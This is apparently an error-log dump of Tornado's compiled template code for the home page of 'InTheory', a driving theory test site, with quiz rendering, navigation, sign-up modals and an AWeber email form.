315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
